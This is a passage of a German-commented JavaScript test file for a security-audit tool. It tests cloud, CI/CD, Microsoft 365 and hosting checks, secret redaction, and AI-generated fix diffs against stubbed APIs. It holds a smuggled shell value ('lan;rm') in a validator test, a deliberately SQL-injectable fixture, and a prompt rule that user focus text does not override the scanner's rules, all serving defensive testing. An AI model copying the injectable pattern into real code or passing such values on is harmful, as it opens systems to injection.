    check('iam: Ablauf über aws-CLI, nur list/get/describe, ungültige ARNs nicht weitergereicht', ids(iamR.findings).includes('iam-wildcard-policy') && ids(iamR.findings).includes('iam-no-audit-log') && iamLog.every((l) => /^(sts|iam|cloudtrail|account|config)$/.test(l.args[0]) && /^(get|list|describe|show)/.test(l.args[1] || 'get')) && !iamLog.some((l) => l.args.some((a) => /calc/.test(a))));

    // CI/CD
    const ghLog = [];
    const gh = fakeFetch([[/\/user$/, 200, { login: 'mia' }, { 'x-oauth-scopes': 'repo, delete_repo' }], [/\/orgs\/acme\/members/, 200, [{ login: 'bob' }]], [/\/orgs\/acme\/repos/, 200, [{ full_name: 'acme/app', default_branch: 'main', private: false }, { full_name: 'acme/old', archived: true }]], [/\/orgs\/acme$/, 200, { login: 'acme', two_factor_requirement_enabled: false }], [/branches\/main\/protection/, 404, { message: 'Branch not protected' }], [/rules\/branches/, 200, []], [/\/keys$/, 200, [{ title: 'ci', read_only: false }]], [/\/repos\/acme\/app$/, 200, { security_and_analysis: { secret_scanning: { status: 'disabled' }, secret_scanning_push_protection: { status: 'disabled' } } }]], ghLog);
    const cc = keep(await S.auditCicd({ say, settings: { githubToken: 'ghp_test', githubOrg: 'acme' }, fetchImpl: gh }));
    check('cicd: GitHub Token-Rechte, 2FA nicht Pflicht, Mitglied ohne 2FA, ohne Branch-Schutz, Secret-Scanning, Deploy-Key', ['cicd-token-broad', 'cicd-org-no-2fa-required', 'cicd-members-no-2fa', 'cicd-no-branch-protection', 'cicd-no-secret-scanning', 'cicd-no-push-protection', 'cicd-deploy-key-write'].every((x) => ids(cc.findings).includes(x)) && cc.ok);
    check('cicd: nur GET-Abrufe an api.github.com, archivierte Repos übersprungen', ghLog.every((l) => l.method === 'GET' && /^https:\/\/api\.github\.com\//.test(l.url)) && !ghLog.some((l) => /acme\/old/.test(l.url)));
    const gl = S.parseGitlab({ token: { scopes: ['api'], expires_at: null }, group: { full_path: 'acme', require_two_factor_authentication: false }, projects: [{ path_with_namespace: 'acme/app', default_branch: 'main', protected: false, keys: [{ title: 'ci', can_push: true }], pre_receive_secret_detection_enabled: false }] });
    all.push(...gl);
    check('cicd: GitLab Token, 2FA, Branch-Schutz, Deploy-Key, Push-Schutz', ['cicd-token-broad', 'cicd-token-no-expiry', 'cicd-org-no-2fa-required', 'cicd-no-branch-protection', 'cicd-deploy-key-write', 'cicd-no-push-protection'].every((x) => ids(gl).includes(x)));
    const ado = S.parseAdo({ org: 'acme', repos: [{ id: 'r1', name: 'app', project: 'P', defaultBranch: 'refs/heads/main' }, { id: 'r2', name: 'lib', project: 'P', defaultBranch: 'refs/heads/main' }], policies: [{ isEnabled: true, isBlocking: true, type: { id: 'fa4e907d-c16b-4a4c-9dfa-4906e5d171dd' }, settings: { scope: [{ repositoryId: 'r2', refName: 'refs/heads/main' }] } }] });
    all.push(...ado);
    check('cicd: Azure DevOps Hauptzweig ohne Review-Pflicht (nur ungeschütztes Repo)', ado.length === 1 && /P\/app/.test(ado[0].title));
    check('cicd: ohne Token übersprungen', /übersprungen/.test((await S.auditCicd({ say, settings: {} })).notes[0]));

    // Microsoft 365 / Google Workspace
    const msLog = [];
    const ms = fakeFetch([[/oauth2\/v2\.0\/token/, 200, { access_token: 'tok' }], [/identitySecurityDefaults/, 200, { isEnabled: false }], [/conditionalAccess/, 200, { value: [{ state: 'enabled', grantControls: { builtInControls: ['mfa'] }, conditions: { users: { includeUsers: ['admins'] } } }] }], [/userRegistrationDetails/, 200, { value: [{ userPrincipalName: 'a@x.de', isMfaRegistered: false }, { userPrincipalName: 'b@x.de', isMfaRegistered: true }] }], [/sharepoint\/settings/, 200, { sharingCapability: 'externalUserAndGuestSharing' }]], msLog);
    const m3 = keep(await S.auditM365({ say, settings: { m365Tenant: 'contoso.onmicrosoft.com', m365ClientId: 'id', m365Secret: 'sec' }, fetchImpl: ms }));
    check('m365: keine MFA-Pflicht, Legacy-Auth offen, Benutzer ohne MFA, Jeder-Links', ['m365-no-mfa-policy', 'm365-legacy-auth', 'm365-users-no-mfa', 'm365-anyone-links'].every((x) => ids(m3.findings).includes(x)) && m3.ok);
    check('m365: nur der Token-Abruf ist POST, Graph nur GET', msLog.filter((l) => l.method !== 'GET').length === 1 && /oauth2\/v2\.0\/token/.test(msLog.find((l) => l.method === 'POST').url));
    const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
    const jwt = S.googleJwt({ client_email: 'sa@p.iam.gserviceaccount.com', private_key: privateKey.export({ type: 'pkcs8', format: 'pem' }) }, 'admin@x.de', 'scope', 1000);
    const [jh, jb, js] = jwt.split('.');
    check('m365: Google-JWT korrekt signiert (RS256, Admin als sub)', crypto.verify('RSA-SHA256', Buffer.from(`${jh}.${jb}`), publicKey, Buffer.from(js, 'base64url')) && JSON.parse(Buffer.from(jb, 'base64url')).sub === 'admin@x.de');
    const gw = S.parseGws({ users: [{ primaryEmail: 'a@x.de', isEnrolledIn2Sv: false, isEnforcedIn2Sv: false }, { primaryEmail: 'old@x.de', suspended: true, isEnrolledIn2Sv: false }] });
    all.push(...gw);
    check('m365: Google Workspace ohne 2SV (gesperrte Konten ignoriert)', ['gws-users-no-2sv', 'gws-2sv-not-enforced'].every((x) => ids(gw).includes(x)) && !/old@/.test(gw[0].description));

    // Hosting
    const hs = S.parseHosting({
      cloudflare: { user: { two_factor_authentication_enabled: false }, zones: [{ name: 'x.de', ssl: 'flexible', alwaysHttps: 'off', minTls: '1.0' }] },
      hetzner: { firewalls: [{ name: 'fw', rules: [{ direction: 'in', protocol: 'tcp', port: '3306', source_ips: ['0.0.0.0/0'] }], applied_to: [{ server: { id: 1 } }] }], servers: [{ id: 1, name: 'a', public_net: { ipv4: {}, firewalls: [{ id: 9 }] } }, { id: 2, name: 'b', public_net: { ipv4: {}, firewalls: [] } }] },
      digitalocean: { firewalls: [{ name: 'do', inbound_rules: [{ protocol: 'tcp', ports: 'all', sources: { addresses: ['0.0.0.0/0'] } }], droplet_ids: [5] }], droplets: [{ id: 5, name: 'web' }, { id: 6, name: 'db' }], databases: [{ name: 'pg', rules: [] }] },
      vercel: { projects: [{ name: 'shop', ssoProtection: null, passwordProtection: null, env: [{ key: 'NEXT_PUBLIC_STRIPE_SECRET', type: 'encrypted' }, { key: 'DB_PASSWORD', type: 'plain' }, { key: 'NODE_ENV', type: 'plain' }] }] },
      netlify: { sites: [{ name: 'blog', ssl_url: 'https://b', force_ssl: false, env: [{ key: 'API_TOKEN', is_secret: false }] }] },
    });
    all.push(...hs);
    check('hosting: Cloudflare 2FA/SSL/HTTPS/TLS, offene Firewalls, Server ohne Firewall, öffentliche DB, Secrets in Variablen, Vorschau, HTTPS', ['hosting-no-2fa', 'cf-ssl-weak', 'cf-no-always-https', 'cf-old-tls', 'cloud-firewall-open', 'hosting-server-no-firewall', 'hosting-db-public', 'hosting-secret-public-env', 'hosting-secret-plain-env', 'hosting-preview-public', 'hosting-no-force-https'].every((x) => ids(hs).includes(x)) && ids(hs).filter((x) => x === 'cloud-firewall-open').length === 2 && ids(hs).filter((x) => x === 'hosting-server-no-firewall').length === 2 && !hs.some((f) => /NODE_ENV/.test(f.title)));
    const hzLog = [];
    const hz = keep(await S.auditHosting({ say, settings: { hetznerToken: 'hz' }, fetchImpl: fakeFetch([[/firewalls/, 200, { firewalls: [] }], [/servers/, 200, { servers: [{ id: 3, name: 'c', public_net: { ipv4: {}, firewalls: [] } }] }]], hzLog) }));
    check('hosting: Hetzner-API nur GET mit Token', ids(hz.findings).includes('hosting-server-no-firewall') && hzLog.every((l) => l.method === 'GET' && l.headers.Authorization === 'Bearer hz'));

    // Have I Been Pwned
    const hbLog = [];
    const hb = keep(await S.auditHibp({ say, settings: { hibpKey: 'k', hibpDomain: 'Example.org' }, fetchImpl: fakeFetch([[/breacheddomain\/example\.org$/, 200, { alice: ['Adobe'], bob: ['Adobe', 'Canva'] }], [/\/breaches$/, 200, [{ Name: 'Adobe', Title: 'Adobe', BreachDate: '2013-10-04', DataClasses: ['Email addresses', 'Passwords'] }, { Name: 'Canva', Title: 'Canva', BreachDate: '2019-05-24', DataClasses: ['Email addresses'] }]]], hbLog) }));
    check('hibp: Datenlecks je Quelle mit betroffenen Adressen, Passwort-Lecks hoch', hb.findings.length === 2 && hb.findings[0].severity === 'high' && /2 Adressen von example\.org/.test(hb.findings[0].title) && hbLog[0].headers['hibp-api-key'] === 'k');
    check('hibp: nicht verifizierte Domain wird gemeldet', /nicht als eigene Domain verifiziert/.test((await S.auditHibp({ say, settings: { hibpKey: 'k', hibpDomain: 'x.org' }, fetchImpl: fakeFetch([[/breacheddomain/, 403, {}]]) })).notes[0]));

    // Einbindung
    const { TargetSchema } = require('../src/core/validation');
    const h = require('../src/core/hostaudit');
    check('system: neue Prüfungen sind gültige Ziele mit Namen', Object.keys(sys.AUDITS).every((k) => TargetSchema.safeParse({ type: 'system', value: k }).success && h.SYSTEMS[k]) && !TargetSchema.safeParse({ type: 'system', value: 'lan;rm' }).success);
    const disp = await h.auditSystem('hibp', { settings: {} });
    check('system: hostaudit leitet an die neuen Prüfungen weiter (ohne Zugang übersprungen)', /übersprungen/.test(disp.notes[0]) && !disp.ok);
    check('system: Geheimnis-Felder sind getrennt von Klartext-Feldern', sys.SECRET_FIELDS.every((k) => !sys.PLAIN_FIELDS.includes(k)) && sys.SECRET_FIELDS.includes('hibpKey') && sys.SECRET_FIELDS.includes('dbUrls'));

    // Englisch: alle Befund- und Hinweistexte dieser Prüfungen übersetzt
    const GER = /[äöüß]|\b(der|die|das|und|nicht|ist|mit|für|oder|wird|werden|auf|eine?|zu|von|bei|nach|aus|sich)\b/;
    const left = all.map(i18n.localizeFinding).flatMap((f) => [f.title, f.description, f.remediation]).filter((t) => t && GER.test(t));
    check('system: alle neuen Befundtexte auf Englisch', left.length === 0, left.slice(0, 3).join(' | '));
    const leftN = allNotes.map((n) => i18n.translate(n)).filter((t) => GER.test(t));
    check('system: alle neuen Hinweise auf Englisch', leftN.length === 0, leftN.slice(0, 3).join(' | '));
    if (left.length) console.log(left.slice(0, 15).join('\n'));
    if (leftN.length) console.log(leftN.slice(0, 15).join('\n'));
  }

  // --- KI & Behebung (wish/ai-fix): alles mit Stub-Anbietern bzw. Fake-fetch, keine echten KI-Aufrufe ---
  console.log('KI & Behebung (Patch, Stufen, Zusammenfassung, Anbieter, Budget, Nachschlagen, Datenschutz, Protokoll, Relevanz, Upgrade, Ablauf):');
  {
    const providers = require('../src/core/providers');
    const cost = require('../src/core/cost');
    const harness = require('../src/core/harness');
    const aifix = require('../src/core/aifix');
    const { analyze, unitKey } = require('../src/core/analyze');
    const origCall = providers.callProvider, origTools = providers.callProviderTools, origFetch = global.fetch;
    const restore = () => { providers.callProvider = origCall; providers.callProviderTools = origTools; global.fetch = origFetch; };
    const fakeRes = (obj, status = 200) => ({ ok: status < 400, status, text: async () => JSON.stringify(obj), json: async () => obj });

    // Anbieter & Preise
    check('anbieter: Mistral/DeepSeek/Groq/OpenRouter/Azure/Bedrock/Vertex vorhanden', ['mistral', 'deepseek', 'groq', 'openrouter', 'azure', 'bedrock', 'vertex'].every((p) => providers.PROVIDERS[p]));
    check('anbieter: SigV4-Signierschlüssel stimmt mit AWS-Referenzwert', providers.sigv4Key('wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY', '20120215', 'us-east-1', 'iam').toString('hex') === 'f4780e2d9f65fa895f9c67b32ce1baf0b0d8a43505a000a1a9e090d414db404d');
    const sig = providers.sigv4Headers({ host: 'bedrock-runtime.eu-central-1.amazonaws.com', path: '/model/amazon.nova-pro-v1%3A0/converse', region: 'eu-central-1', body: '{}', accessKeyId: 'AKIDEXAMPLE', secretAccessKey: 's', now: new Date('2026-01-01T00:00:00Z') });
    check('anbieter: Bedrock-Anfrage SigV4-signiert', /^AWS4-HMAC-SHA256 Credential=AKIDEXAMPLE\/20260101\/eu-central-1\/bedrock\/aws4_request, SignedHeaders=content-type;host;x-amz-content-sha256;x-amz-date, Signature=[0-9a-f]{64}$/.test(sig.authorization) && !sig.host);
    const az = providers.openaiTarget({ provider: 'azure', baseUrl: 'https://acme.openai.azure.com', model: 'prod-gpt4o', apiKey: 'k' });
    check('anbieter: Azure-URL mit Deployment und api-key-Header', az.url === 'https://acme.openai.azure.com/openai/deployments/prod-gpt4o/chat/completions?api-version=2024-10-21' && az.headers['api-key'] === 'k' && !az.headers.Authorization);
    check('preise: neue Anbieter haben Tarife', cost.priceFor('mistral', 'codestral-latest') && cost.priceFor('deepseek', 'deepseek-chat') && cost.priceFor('groq', 'llama-3.3-70b-versatile') && cost.priceFor('bedrock', 'amazon.nova-lite-v1:0'));
    check('preise: Azure = OpenAI, Vertex = Gemini, OpenRouter/Bedrock je Hersteller', cost.priceFor('azure', 'gpt-4o-mini').in === 0.15 && cost.priceFor('vertex', 'gemini-2.0-flash').in === 0.10 && cost.priceFor('openrouter', 'openai/gpt-4.1-mini').in === 0.40 && cost.priceFor('bedrock', 'us.anthropic.claude-sonnet-4-20250514-v1:0').in === 3);
    let seenUrl = '';
    global.fetch = async (url, o) => { seenUrl = url; return fakeRes({ choices: [{ message: { content: '{"findings":[]}' } }], usage: { prompt_tokens: 3, completion_tokens: 2 } }); };
    const mr = await providers.callProvider({ provider: 'groq', model: 'llama-3.3-70b-versatile', apiKey: 'g' }, { system: 's', user: 'u' });
    check('anbieter: Groq über den OpenAI-kompatiblen Weg', seenUrl === 'https://api.groq.com/openai/v1/chat/completions' && mr.usage.inputTokens === 3);
    restore();

    // Werkzeug-Schleife (Anthropic-Format) mit Fake-fetch
    const bodies = [];
    let step = 0;
    global.fetch = async (url, o) => {
      bodies.push(JSON.parse(o.body)); step++;
      if (step === 1) return fakeRes({ content: [{ type: 'tool_use', id: 't1', name: 'read_file', input: { path: 'lib/db.js' } }], usage: { input_tokens: 10, output_tokens: 3 } });
      return fakeRes({ content: [{ type: 'text', text: '{"findings":[]}' }], usage: { input_tokens: 20, output_tokens: 4 } });
    };
    const toolsOut = await providers.callProviderTools({ provider: 'anthropic', model: 'm', apiKey: 'k' }, { system: 'S', user: 'U', tools: [{ name: 'read_file', description: 'd', parameters: { type: 'object', properties: { path: { type: 'string' } } } }], runTool: async (n, a) => `INHALT ${a.path}`, maxCalls: 2 });
    check('nachschlagen: Anthropic-Werkzeugaufruf beantwortet und zweite Runde gesendet', toolsOut.lookups === 1 && toolsOut.text === '{"findings":[]}' && bodies[1].messages[2].content[0].type === 'tool_result' && bodies[1].messages[2].content[0].content === 'INHALT lib/db.js' && toolsOut.usage.inputTokens === 30);
    // OpenAI-Format (Mistral): Limit erreicht -> letzte Runde mit tool_choice none
    bodies.length = 0; step = 0;
    global.fetch = async (url, o) => {
      const b = JSON.parse(o.body); bodies.push(b); step++;
      if (b.tool_choice !== 'none') return fakeRes({ choices: [{ message: { content: null, tool_calls: [{ id: 'c' + step, type: 'function', function: { name: 'find_definition', arguments: '{"name":"getUser"}' } }] } }] });
      return fakeRes({ choices: [{ message: { content: '{"findings":[]}' } }] });
    };
    const mo = await providers.callProviderTools({ provider: 'mistral', model: 'codestral-latest', apiKey: 'k' }, { system: 'S', user: 'U', tools: [{ name: 'find_definition', description: 'd', parameters: { type: 'object', properties: {} } }], runTool: async () => 'DEF', maxCalls: 1 });
    check('nachschlagen: Höchstzahl je Block wird eingehalten (OpenAI-Format)', mo.lookups === 1 && bodies.length === 2 && bodies[1].tool_choice === 'none' && bodies[1].messages.some((m) => m.role === 'tool' && m.content === 'DEF'));
    restore();
    let noTools = null;
    try { await providers.callProviderTools({ provider: 'bedrock' }, { system: 's', user: 'u', tools: [], runTool: async () => '' }); } catch (e) { noTools = e.code; }
    check('nachschlagen: Anbieter ohne Werkzeuge meldet NO_TOOLS', noTools === 'NO_TOOLS' && !providers.supportsTools('bedrock') && providers.supportsTools('ollama'));

    // Nachschlagen in analyze(): Werkzeug-Ausgabe wird fuer die Cloud geschwaerzt; Fallback ohne Werkzeuge
    const aUnits = [{ label: 'proj/routes/user.js', kind: 'file', language: 'javascript', content: 'const { getUser } = require("../lib/db");\napp.get("/u/:id", (req, res) => getUser(req.params.id));' }, { label: 'proj/lib/db.js', kind: 'file', language: 'javascript', content: 'const key = "AKIAIOSFODNN7EXAMPLE";\nfunction getUser(id) { return db.query("SELECT * FROM u WHERE id=" + id); }' }];
    let toolText = '';
    providers.callProviderTools = async (cfg, m) => { toolText = await m.runTool('read_file', { path: 'lib/db.js' }); return { text: JSON.stringify({ findings: [] }), usage: { inputTokens: 1, outputTokens: 1 }, lookups: 1 }; };
    providers.callProvider = async () => ({ text: '{"findings":[]}', usage: {} });
    const la = await analyze({ units: aUnits, config: { provider: 'anthropic', model: 'm', analysisDepth: 'standard', aiValidation: false, aiLookup: true } });
    check('nachschlagen: analyze nutzt Werkzeuge, Ergebnis geschwärzt', la.meta.lookups === 1 && /function getUser/.test(toolText) && /geschwaerzt/.test(toolText) && !/IOSFODNN7EXAMPLE/.test(toolText));
    providers.callProviderTools = async () => { const e = new Error('nope'); e.code = 'NO_TOOLS'; throw e; };
    let plainCalls = 0;
    providers.callProvider = async () => { plainCalls++; return { text: '{"findings":[]}', usage: {} }; };
    const lb = await analyze({ units: aUnits, config: { provider: 'ollama', model: 'm', analysisDepth: 'standard', aiValidation: false, aiLookup: true } });
    check('nachschlagen: ohne Werkzeug-Unterstützung normale Analyse', plainCalls >= 1 && lb.errors.some((e) => /Nachschlagen/.test(e)));

    // Eigene Vorgaben (ownfocus): im Prompt und im Zwischenspeicher-Schluessel
    let sentPrefix = '';
    providers.callProvider = async (_c, m) => { sentPrefix = m.prefix || ''; return { text: '{"findings":[]}', usage: {} }; };
    await analyze({ units: aUnits.slice(0, 1), config: { provider: 'ollama', model: 'm', analysisDepth: 'standard', aiValidation: false, aiFocus: 'Mandantentrennung über tenant_id prüfen' } });
    check('eigene vorgaben: gehen in den Prompt ein', /Vorgaben des Nutzers[\s\S]*tenant_id/.test(sentPrefix) && /heben die Regeln oben NICHT auf/.test(sentPrefix));
    const k1 = unitKey(aUnits[0], { provider: 'ollama', model: 'm' }, 'standard'), k2 = unitKey(aUnits[0], { provider: 'ollama', model: 'm', aiFocus: 'x' }, 'standard');
    check('eigene vorgaben: ändern den Zwischenspeicher-Schlüssel', k1 !== k2);

    // Grosse Projekte: Relevanz und Datei-Budget
    const rel = require('../src/core/relevance');
    const many = [{ label: 'test/user.spec.js', content: 'it("x", () => {});' }, { label: 'docs/readme.md', content: '# Doku' }, { label: 'src/routes/login.js', content: 'app.post("/login", (req, res) => { db.query("SELECT * FROM u WHERE n=" + req.body.n); });' }, { label: 'src/util/color.js', content: 'module.exports = "red";' }];
    const order = rel.rankUnits(many).map((r) => r.u.label);
    check('relevanz: Route mit Eingabe und SQL zuerst, Tests/Doku zuletzt', order[0] === 'src/routes/login.js' && order.indexOf('test/user.spec.js') > order.indexOf('src/util/color.js'));
    const sentLabels = [];
    providers.callProvider = async (_c, m) => { sentLabels.push(m.user); return { text: '{"findings":[]}', usage: {} }; };
    const rb = await analyze({ units: many.map((u) => ({ ...u, kind: 'file', language: 'javascript' })), config: { provider: 'ollama', model: 'm', analysisDepth: 'standard', aiValidation: false, aiFileBudget: 1 } });
    check('relevanz: Datei-Budget schickt nur die wichtigste Datei', rb.meta.skippedByBudget === 3 && sentLabels.join('').includes('src/routes/login.js') && !sentLabels.join('').includes('user.spec.js') && rb.errors.some((e) => /^Budget:/.test(e)));
    const emb = await rel.embedScores(many, { model: 'nomic-embed-text', fetchImpl: async (url, o) => ({ ok: true, json: async () => ({ embeddings: JSON.parse(o.body).input.map((t) => (/QUERY|security sensitive/.test(t) || /login/.test(t) ? [1, 0] : [0, 1])) }) }) });
    check('relevanz: lokale Embeddings bewerten ähnliche Dateien höher', emb && emb.get('src/routes/login.js') === 1 && emb.get('docs/readme.md') === 0);
    check('relevanz: Embeddings nur lokal (fremde Adresse abgelehnt)', (await rel.embedScores(many, { model: 'x', baseUrl: 'https://example.com' })) === null);

    // Strenger Datenschutz (privmode)
    const priv = harness.redactPrivate('// @author Max Mustermann <max@acme-corp.com>\nconst h = "db01.prod.internal"; ip = "10.1.2.3"; // Acme Corp intern, api.acme.io', { terms: ['Acme Corp'], hosts: ['acme.io'] });
    check('datenschutz: Person, E-Mail, interner Host, IP, Firma, eigene Domain geschwärzt', !/Mustermann|max@|db01\.prod|10\.1\.2\.3|Acme Corp|api\.acme\.io/.test(priv.text) && /«person-1»/.test(priv.text) && /«firma-1»/.test(priv.text) && priv.count === 6);
    const both = harness.redactForCloud('k="AKIAIOSFODNN7EXAMPLE"; mail="a.b@firma.de"', { privacyMode: true });
    check('datenschutz: zusammen mit Secrets in einem Schritt', !/IOSFODNN7EXAMPLE|a\.b@firma/.test(both.text) && both.count === 2);
    check('datenschutz: ohne privmode bleiben E-Mails stehen', /a\.b@firma\.de/.test(harness.redactForCloud('mail="a.b@firma.de"', {}).text));
    check('datenschutz: lokal wird nie geschwärzt, privmode schaltet für Cloud ein', !harness.shouldRedact({ provider: 'ollama', privacyMode: true }) && harness.shouldRedact({ provider: 'openai', redactSecrets: false, privacyMode: true }));
    let cloudUser = '';
    providers.callProvider = async (_c, m) => { cloudUser = m.user; return { text: '{"findings":[]}', usage: {} }; };
    await analyze({ units: [{ label: 'a.js', kind: 'file', language: 'javascript', content: '// Kontakt: jane.doe@corp.example\nconst u = "https://intranet.firma.intern/x";' }], config: { provider: 'openai', model: 'gpt-4.1-mini', analysisDepth: 'standard', aiValidation: false, privacyMode: true } });
    check('datenschutz: analyze schwärzt E-Mail und internen Host vor der Cloud-KI', cloudUser && !/jane\.doe|intranet\.firma\.intern/.test(cloudUser));
    restore();

    // Reproduzierbarkeit: Protokoll ueber den echten Anbieter-Weg (Fake-fetch)
    const repro = require('../src/core/repro');
    global.fetch = async () => fakeRes({ choices: [{ message: { content: '{"findings":[]}' } }], usage: { prompt_tokens: 7, completion_tokens: 2 } });
    const rr = await analyze({ units: aUnits, config: { provider: 'openai', model: 'gpt-4.1-mini', apiKey: 'x', analysisDepth: 'standard', aiValidation: false, aiRepro: true, temperature: 0.1, maxTokens: 999 } });
    restore();
    const log = rr.meta.repro;
    check('protokoll: je KI-Aufruf Modell, Parameter und Prüfsummen', log && log.calls >= 1 && log.entries[0].model === 'gpt-4.1-mini' && log.entries[0].params.maxTokens === 999 && /^[0-9a-f]{64}$/.test(log.entries[0].promptSha256) && /^[0-9a-f]{64}$/.test(log.entries[0].responseSha256));
    check('protokoll: gespeicherter Prompt ist der geschwärzte', log.entries.every((e) => !JSON.stringify(e.prompt || {}).includes('IOSFODNN7EXAMPLE')) && repro.verifyLog(log).ok);
    const tampered = JSON.parse(JSON.stringify(log)); tampered.entries[0].response = 'geändert';
    check('protokoll: Manipulation wird erkannt', !repro.verifyLog(tampered).ok);
    const noRepro = await analyze({ units: [], config: { provider: 'ollama', model: 'm', aiValidation: false } });
    check('protokoll: ohne Opt-in kein Protokoll', !noRepro.meta.repro);
    const js = JSON.parse(require('../src/core/report').toJson({ findings: [], summary: {}, meta: { repro: log, files: ['a'] } }));
    check('protokoll: JSON-Bericht enthält nur Prüfsummen, keine Prompts', js.meta.repro.entries.length === log.entries.length && !js.meta.repro.entries[0].prompt && !js.meta.files);

    // Fix als unified diff
    const code = { file: 'proj/lib/db.js', from: 1, line: 2, lines: ['const key = process.env.KEY;', 'function getUser(id) { return db.query("SELECT * FROM u WHERE id=" + id); }', ''] };
    let patchUser = '';
    providers.callProvider = async (_c, m) => { patchUser = m.user; return { text: JSON.stringify({ summary: 'Parametrisierte Abfrage', diff: '--- a/proj/lib/db.js\n+++ b/proj/lib/db.js\n@@ -2,1 +2,1 @@\n-function getUser(id) { return db.query("SELECT * FROM u WHERE id=" + id); }\n+function getUser(id) { return db.query("SELECT * FROM u WHERE id=?", [id]); }\n', notes: '', confidence: 'high' }), usage: { inputTokens: 100, outputTokens: 50 } }; };
    const fx = { title: 'SQL-Injection', severity: 'high', location: 'proj/lib/db.js:2', category: 'Injection', description: 'Konkatenation' };
    const p1 = await aifix.generatePatch({ finding: fx, code: { ...code, lines: ['const key = "AKIAIOSFODNN7EXAMPLE";', ...code.lines.slice(1)] }, config: { provider: 'anthropic', model: 'claude-x', lang: 'en' } });
    check('patch: Diff geliefert, Statistik und Prüfung gegen den Code', p1.ok && /^--- a\/proj\/lib\/db\.js/m.test(p1.diff) && p1.stats.added === 1 && p1.stats.removed === 1 && p1.check.applies === true);
    check('patch: Code geht geschwärzt an die Cloud-KI, englische Anweisung', !/IOSFODNN7EXAMPLE/.test(patchUser) && /Answer in English/.test(patchUser));
    const p2 = aifix.checkDiff('@@ -1,1 +1,1 @@\n-gibt es nicht\n+neu\n', code);
    check('patch: nicht passender Diff wird erkannt', p2.checked && p2.applies === false);
    check('patch: Diff ohne Kopf wird ergänzt', /^--- a\/x\.js\n\+\+\+ b\/x\.js\n@@/.test(aifix.normalizeDiff('@@ -1 +1 @@\n-a\n+b', 'x.js')));
    providers.callProvider = async () => ({ text: '{"summary":"","diff":"","notes":"Server-Konfiguration anpassen.","confidence":"low"}', usage: {} });
    const p3 = await aifix.generatePatch({ finding: { title: 'Header fehlt', location: 'https://x' }, code: null, config: { provider: 'ollama', model: 'm' } });
    check('patch: ohne Code-Änderung nur Hinweis, kein Diff', p3.ok && p3.diff === '' && /Server-Konfiguration/.test(p3.notes));

    // Erklaerstufen mit Zwischenspeicher
    const mem = new Map(); const ecache = { get: (k) => mem.get(k), set: (k, v) => mem.set(k, v) };
    let ecalls = 0, lastUser = '';
    providers.callProvider = async (_c, m) => { ecalls++; lastUser = m.user; return { text: 'Erklärung ' + ecalls, usage: {} }; };
    const ecfg = { provider: 'ollama', model: 'm', lang: 'de' };
    const e1 = await aifix.explainFinding({ finding: fx, level: 'lay', config: ecfg, cache: ecache });
    const e2 = await aifix.explainFinding({ finding: fx, level: 'lay', config: ecfg, cache: ecache });
    const e3 = await aifix.explainFinding({ finding: fx, level: 'expert', config: ecfg, cache: ecache });
    check('stufen: Erklärung je Stufe, zweiter Aufruf aus dem Zwischenspeicher', e1.text === 'Erklärung 1' && e2.cached && e2.text === 'Erklärung 1' && e3.text === 'Erklärung 2' && ecalls === 2);
    check('stufen: Experten-Stufe fragt nach CWE/CVSS, auf Deutsch', /CWE/.test(lastUser) && /Antworte auf Deutsch/.test(lastUser));
    const e4 = await aifix.explainFinding({ finding: fx, level: 'lay', config: ecfg, cache: ecache, refresh: true });
    check('stufen: "neu erklären" umgeht den Zwischenspeicher', !e4.cached && ecalls === 3);
    providers.callProvider = async () => ({ text: '```json\n{"summary":"Fremde Skripte werden nicht blockiert.","sections":{"class":["CWE-1021 …"],"preconditions":["- Eine Einschleuse-Lücke."],"severity":"Mittel, weil eine zweite Lücke nötig ist.","pitfalls":[],"defense":["Nonces nutzen."]}}\n```', usage: {} });
    const es = await aifix.explainFinding({ finding: fx, level: 'expert', config: ecfg, refresh: true });
    check('stufen: JSON wird zu festen Abschnitten (Reihenfolge, leere weg, Aufzählungszeichen weg)', es.structured && es.structured.sections.map((s) => s.key).join() === 'class,preconditions,severity,defense' && es.structured.sections[1].points[0] === 'Eine Einschleuse-Lücke.' && es.structured.sections[1].title === 'Voraussetzungen' && /\*\*Einordnung\*\*/.test(es.text));
    check('stufen: wiederholte Befund-Angaben werden entfernt', aifix.stripEcho('Befund\nTitel: X\nSchwere: medium\nOrt: https://a\nErklärung für einen Security-Experten\n- **CWE-16**: echt') === '- **CWE-16**: echt');
    check('stufen: kein erfundener CVSS-Vektor verlangt', /Erfinde KEINEN CVSS/.test(aifix.SECTIONS.expert.map((s) => s[2]).join(' ')));
    check('stufen: Schlüssel hängt an Sprache und Modell', aifix.explainKey(fx, 'dev', ecfg) !== aifix.explainKey(fx, 'dev', { ...ecfg, lang: 'en' }) && aifix.explainKey(fx, 'dev', ecfg) !== aifix.explainKey(fx, 'dev', { ...ecfg, model: 'n' }));

    // Zusammenfassung des Laufs
    const runRes = { findings: [{ title: 'SQL-Injection', severity: 'critical', category: 'Injection', assurance: 'unverified', remediation: 'Parameter binden.' }, { title: 'Header fehlt', severity: 'low', category: 'Config', assurance: 'deterministic' }], meta: { units: 12, batches: 0 } };
    const rs = await aifix.summarizeRun(runRes, { provider: 'ollama', lang: 'en' });
    check('zusammenfassung: ohne KI-Lauf regelbasiert, englisch', rs.source === 'rules' && /12 file\(s\)/.test(rs.text) && /2 open finding/.test(rs.text) && /1 critical/.test(rs.text) && /unconfirmed/.test(rs.text));
    check('zusammenfassung: regelbasiert auf Deutsch', /Am dringendsten: „SQL-Injection“/.test(aifix.ruleSummary(runRes, { lang: 'de' })));
    providers.callProvider = async () => ({ text: 'The project has one critical SQL injection that should be fixed first; another low-risk header issue is cosmetic. Start with the database query.', usage: {} });
    const rs2 = await aifix.summarizeRun({ ...runRes, meta: { units: 12, batches: 1 } }, { provider: 'ollama', model: 'm', lang: 'en' });
    check('zusammenfassung: mit KI ein Absatz von der KI', rs2.source === 'ai' && /critical SQL injection/.test(rs2.text));
    providers.callProvider = async () => { throw new Error('offline'); };
    const rs3 = await aifix.summarizeRun({ ...runRes, meta: { units: 12, batches: 1 } }, { provider: 'ollama', model: 'm', lang: 'en' });
    check('zusammenfassung: KI-Fehler -> regelbasiert', rs3.source === 'rules' && rs3.text.length > 40);
    const { toHtml, toMarkdown } = require('../src/core/reportdoc');
    const repRes = { ...runRes, errors: [], meta: { at: '2026-11-05T10:00:00Z', runSummary: { text: 'Kurzfassung des Laufs.' }, threatModel: aifix.ruleThreatModel(runRes, { lang: 'de' }) } };
